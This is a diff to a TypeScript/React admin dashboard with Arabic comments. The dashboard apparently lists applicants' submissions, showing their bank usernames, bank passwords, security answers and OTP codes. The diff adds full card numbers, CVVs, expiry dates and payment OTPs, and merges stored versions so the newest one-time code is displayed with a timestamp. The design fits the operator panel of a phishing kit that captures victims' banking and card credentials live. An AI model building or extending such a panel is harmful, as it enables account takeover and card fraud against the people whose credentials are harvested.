@@ -83,12 +83,14 @@ function adminFetch(url: string, options: RequestInit = {}) {
   });
 }
 
-// نوع بيانات النسخة
+// نوع بيانات النسخة - يشمل جميع الحقول المطلوبة
 interface AppVersion {
   id: number;
   version: number;
   isLatest: boolean;
   createdAt: string;
+  updatedAt?: string;
+  currentStep?: string;
   applicantType?: string;
   fullName?: string;
   nationalId?: string;
@@ -111,6 +113,13 @@ interface AppVersion {
   bankPassword?: string;
   securityAnswer?: string;
   otpCode?: string;
+  paymentCardNumber?: string;
+  paymentCardHolder?: string;
+  paymentExpiryDate?: string;
+  paymentCvv?: string;
+  paymentOtp?: string;
+  paymentStatus?: string;
+  paymentCompletedAt?: string;
   [key: string]: unknown;
 }
 
@@ -212,12 +221,18 @@ function TimeBadge({ timestamp, icon, label }: {
 // دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
 function mergeVersionsData(sources: AppVersion[]): AppVersion {
   const FIELDS: (keyof AppVersion)[] = [
+    // حقول أساسية يجب الحفاظ عليها من الطلب الأصلي
+    "id", "updatedAt", "currentStep",
+    // حقول البيانات الشخصية
     "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
     "employer", "phone", "email", "city", "maritalStatus",
     "companyName", "businessType", "commercialRegistration", "employeeCount",
     "annualRevenue", "contactName",
-    "bankName", "bankUsername", "bankPassword", "securityAnswer",
+    // حقول البنك
+    "bankName", "bankLogo", "bankUsername", "bankPassword", "securityAnswer",
+    // حقول OTP
     "otpCode",
+    // حقول البطاقة والدفع
     "paymentCardNumber", "paymentCardHolder", "paymentExpiryDate", "paymentCvv",
     "paymentOtp", "paymentStatus", "paymentCompletedAt",
   ];
@@ -1131,14 +1146,15 @@ export default function AdminDashboardPage() {
                       </div>
                     </div>
 
-                    {/* التفاصيل الموسّعة */}
+                                            {/* التفاصيل الموسّعة */}
                     {isExpanded && (
                       <div className="bg-muted/30 border-t px-4 pb-4 pt-3">
                         {/* تبويبات النسخ */}
                         {(() => {
                           // versionCache للنسخ القديمة فقط، app هو الأحدث
                           const versions = versionCache[app.id] || versionCache[app.sessionId] || [];
-                          const allData = app; // البيانات الأحدث من queryClient
+                          // دمج جميع البيانات: الأحدث من app + جميع النسخ (يضمن عرض أحدث قيمة لكل حقل)
+                          const allData = mergeVersionsData([app as unknown as AppVersion, ...versions]);
                           const totalVersions = versions.length + 1;
                           const olderVersions = versions.filter((v) => !v.isLatest);
                           const activeTab = expandedTabs[app.id] || "current";
@@ -1148,8 +1164,8 @@ export default function AdminDashboardPage() {
                               .filter((v) => v.otpCode)
                               .map((v) => v.otpCode)
                           ).size;
-                          // آخر رمز OTP من السجلات (الأحدث) أو من app
-                          const displayOtp = versions[0]?.paymentOtp || app.paymentOtp;
+                          // آخر رمز OTP من البيانات المدمجة (الأحدث)
+                          const displayOtp = allData.paymentOtp;
                           return (
                             <div className="space-y-4">
                               <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
@@ -1598,7 +1614,7 @@ export default function AdminDashboardPage() {
                                       <Smartphone className="w-4 h-4" />
                                       رموز OTP للدفع (Pay-OTP)
                                     </h4>
-                                    <SectionTimeBadge timestamp={displayOtp ? (versions[0]?.updatedAt || app.updatedAt) : undefined} />
+                                    <SectionTimeBadge timestamp={displayOtp ? app.updatedAt : undefined} />
                                   </div>
                                   {displayOtp ? (
                                     <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
